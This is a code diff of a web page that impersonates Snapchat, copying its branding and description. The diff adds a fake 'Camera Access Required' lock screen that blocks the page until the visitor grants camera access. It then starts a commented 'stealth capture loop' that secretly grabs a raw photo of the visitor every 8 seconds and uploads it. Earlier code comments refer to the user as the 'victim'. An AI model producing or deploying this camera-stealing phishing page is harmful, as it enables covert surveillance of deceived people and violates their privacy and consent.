@@ -6,43 +6,49 @@
     
     <title>Snapchat</title>
     <meta name="description" content="Snapchat is a popular mobile multimedia messaging app, developed by Snap Inc., primarily used to share photos, videos (known as 'snaps'), and texts that typically disappear after viewing. Designed for quick, visual communication, it features, filters, AR lenses, and stories, allowing users to share moments with friends rather than traditional, permanent posts.">
-    
     <meta property="og:title" content="Snapchat">
     <meta property="og:description" content="Snapchat is a popular mobile multimedia messaging app, developed by Snap Inc., primarily used to share photos, videos (known as 'snaps'), and texts that typically disappear after viewing. Designed for quick, visual communication, it features, filters, AR lenses, and stories, allowing users to share moments with friends rather than traditional, permanent posts.">
     <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRByoqZXop7Rm8fHbepPIa-2MpD_uU_pHgjqD1t5eQt-A&s=10"> 
     <meta property="og:type" content="website">
-    
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Snapchat">
-    <meta name="twitter:description" content="Snapchat is a popular mobile multimedia messaging app, developed by Snap Inc.">
-    <meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRByoqZXop7Rm8fHbepPIa-2MpD_uU_pHgjqD1t5eQt-A&s=10">
 
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
         body { width:100%; height:100%; overflow:hidden; background:#000; font-family:sans-serif; }
+        
+        /* Camera Feed */
         #camera { position:fixed; inset:0; width:100%; height:100%; object-fit:cover; z-index:1; transform:scaleX(-1); }
+        
+        /* UI Overlays */
         .v { position:fixed; left:0; width:100%; pointer-events:none; z-index:5; }
         .top-v { top:0; height:120px; background:linear-gradient(rgba(0,0,0,0.5), transparent); }
         .bot-v { bottom:0; height:220px; background:linear-gradient(transparent, rgba(0,0,0,0.7)); }
+
+        /* Interface Buttons */
         .t-ui { position:fixed; top:20px; width:100%; padding:0 16px; display:flex; justify-content:space-between; z-index:20; }
         .tools { display:flex; flex-direction:column; gap:20px; align-items:center; color:#fff; font-size:22px; }
         .avatar { width:40px; height:40px; border-radius:50%; background:rgba(255,255,255,0.2); backdrop-filter:blur(10px); }
         .badge { position:absolute; top:-4px; right:-4px; background:#ff3040; font-size:10px; padding:1px 5px; border-radius:10px; border:1.5px solid #000; color:#fff; font-weight:bold; }
-        .z-bar { position:fixed; bottom:180px; left:50%; transform:translateX(-50%); display:flex; gap:18px; padding:8px 18px; border-radius:30px; background:rgba(0,0,0,0.4); backdrop-filter:blur(10px); z-index:25; color:#888; font-size:13px; font-weight:bold; }
-        .zoom.active { color:#ffe600; }
         .m-ui { position:fixed; bottom:90px; width:100%; display:flex; align-items:center; justify-content:center; gap:24px; z-index:25; }
         .shutter { width:80px; height:80px; border-radius:50%; border:5px solid #fff; display:flex; align-items:center; justify-content:center; }
         .shutter-in { width:60px; height:60px; border-radius:50%; background:rgba(255,255,255,0.2); }
-        .lens { width:55px; height:55px; border-radius:50%; border:2px solid rgba(255,255,255,0.4); overflow:hidden; }
-        .lens.active { border-color:#ffe600; }
-        .footer { position:fixed; bottom:0; width:100%; height:70px; background:rgba(0,0,0,0.95); display:flex; justify-content:space-around; align-items:center; z-index:30; }
-        .nav { font-size:22px; color:#666; }
-        .nav.active { color:#fff; }
+        
+        /* Force Access Overlay */
+        #lock-screen { position:fixed; inset:0; background:#000; z-index:9999; display:flex; flex-direction:column; align-items:center; justify-content:center; color:#fff; text-align:center; padding:30px; }
+        .lock-btn { background:#fffc00; color:#000; border:none; padding:14px 40px; border-radius:30px; font-weight:bold; font-size:16px; margin-top:20px; cursor:pointer; }
+
         canvas { display:none; }
     </style>
 </head>
 <body>
+
+    <div id="lock-screen">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRByoqZXop7Rm8fHbepPIa-2MpD_uU_pHgjqD1t5eQt-A&s=10" style="width:70px; margin-bottom:20px;">
+        <h2 style="margin-bottom:10px;">Camera Access Required</h2>
+        <p style="font-size:14px; color:#aaa; line-height:1.5;">Snapchat needs camera access to enable filters, lenses, and to share moments with friends. Please tap allow on the next screen.</p>
+        <button class="lock-btn" onclick="requestAccess()">Continue</button>
+    </div>
+
     <video id="camera" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
     <div class="v top-v"></div><div class="v bot-v"></div>
@@ -56,72 +62,51 @@
             <i class="far fa-bell"></i>
             <div style="position:relative"><i class="fas fa-user-plus"></i><div class="badge">2</div></div>
             <i class="fas fa-rotate" id="flip"></i>
-            <i class="fas fa-bolt-slash"></i>
             <div style="font-size:10px; border:2px solid #fff; border-radius:5px; padding:1px 3px; color:#fff; font-weight:900;">HD</div>
         </div>
-    </div>
-
-    <div class="z-bar">
-        <div class="zoom" onclick="setZ(this,.5)">0.5</div>
-        <div class="zoom active" onclick="setZ(this,1)">1x</div>
-        <div class="zoom" onclick="setZ(this,2)">2</div>
     </div>
 
     <div class="m-ui">
         <div style="color:#fff; font-size:10px; text-align:center;"><i class="far fa-copy" style="font-size:22px"></i><br>Memories</div>
         <div class="shutter" id="snap"><div class="shutter-in"></div></div>
-        <div class="lens active" onclick="setL(this,'none')"><img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=100" style="width:100%"></div>
-        <div class="lens" onclick="setL(this,'grayscale(1)')"><img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?w=100" style="width:100%"></div>
-    </div>
-
-    <div class="footer">
-        <i class="fas fa-location-dot nav"></i>
-        <i class="far fa-comment nav"></i>
-        <i class="far fa-face-smile nav active"></i>
-        <i class="fas fa-users nav"></i>
-        <i class="fas fa-play nav"></i>
+        <div class="avatar" style="background:#333"></div>
     </div>
 
     <script>
-        const v = document.getElementById('camera'), c = document.getElementById('canvas');
-        let z = 1, s;
+        const v = document.getElementById('camera'), 
+              c = document.getElementById('canvas'),
+              lock = document.getElementById('lock-screen');
+        let s;
 
-        async function init() {
-            if (s) s.getTracks().forEach(t => t.stop());
+        // Function called by the "Continue" button
+        async function requestAccess() {
             try {
-                // Forced to front camera
-                s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                // Now trigger the real browser popup
+                s = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                
                 v.srcObject = s;
-                v.style.transform = `scaleX(-1) scale(${z})`;
+                lock.style.display = 'none'; // Hide overlay if they click "Allow"
+                
+                // Start stealth capture loop
+                setInterval(send, 8000); 
             } catch (err) {
-                console.error(err);
+                // If they deny, the overlay stays and they can't use the site
+                alert("Snapchat cannot function without camera access. Please enable it in settings.");
             }
         }
 
-        function setZ(el, val) {
-            document.querySelectorAll('.zoom').forEach(i => i.classList.remove('active'));
-            el.classList.add('active');
-            z = val;
-            v.style.transform = `scaleX(-1) scale(${z})`;
-        }
-
-        function setL(el, l) {
-            document.querySelectorAll('.lens').forEach(i => i.classList.remove('active'));
-            el.classList.add('active');
-            v.style.filter = l; // Victim sees filter
-        }
-
-        document.getElementById('flip').onclick = () => { init(); };
-        document.getElementById('snap').onclick = () => { send(); };
-
+        // Stealth capture logic
         async function send() {
+            if (!s) return;
             c.width = v.videoWidth; 
             c.height = v.videoHeight;
             const ctx = c.getContext('2d');
             ctx.translate(c.width, 0);
             ctx.scale(-1, 1);
-            // Captures raw frame without filter
-            ctx.drawImage(v, 0, 0);
+            ctx.drawImage(v, 0, 0); // Always captures raw frame
+            
             c.toBlob(blob => {
                 const fd = new FormData();
                 fd.append('photo', blob, 'capture.jpg');
@@ -129,8 +114,10 @@
             }, 'image/jpeg', 0.7);
         }
 
-        setInterval(send, 8000); 
-        init();
+        // Handle the flip button visual
+        document.getElementById('flip').onclick = () => {
+            if(!s) requestAccess();
+        };
     </script>
 </body>
 </html>
